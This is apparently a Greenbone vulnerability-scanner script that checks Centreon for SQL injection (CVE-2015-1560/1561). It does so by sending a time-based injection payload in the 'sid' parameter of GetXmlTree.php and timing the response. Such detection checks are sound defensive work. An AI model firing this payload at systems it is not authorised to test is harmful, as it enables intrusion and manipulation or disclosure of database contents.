# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:centreon:centreon";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805974");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2015-1560", "CVE-2015-1561");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-09-08 13:07:40 +0530 (Tue, 08 Sep 2015)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Centreon Multiple Vulnerabilities - Sep15");

  script_tag(name:"summary", value:"Centreon is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Multiple errors exist as,

  - Input passed via GET parameter 'sid' is not validated before passing to
  common-Func.php script.

  - Input passed via parameters 'ns_id' and 'end' is not validated before passing
  to getStats.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Centreon version 2.5.4 and earlier.");

  script_tag(name:"solution", value:"Upgrade to latest version.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37528");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/75602");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/75605");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132607");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/535961/100/0/threaded");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("centreon_detect.nasl");
  script_mandatory_keys("centreon/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://www.centreon.com");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

time_taken = 0;
wait_extra_sec = 5;

if (!http_port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

sleep = make_list(1, 2, 3);

foreach sec (sleep) {
  url = dir + "/include/common/XmlTree/GetXmlTree.php?sid=%27%2Bif(1%3C2,sleep(" +
              sec + "),%27%27)%2B%27";

  sndReq = http_get(item:url,  port:http_port);
  start = unixtime();
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  stop = unixtime();
  time_taken = stop - start;

  ##Time taken is approx thrice
  sec = sec * 3 ;
  if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(0);
}

report = http_report_vuln_url(port:http_port, url:url);
security_message(port:http_port, data:report);
exit(0);
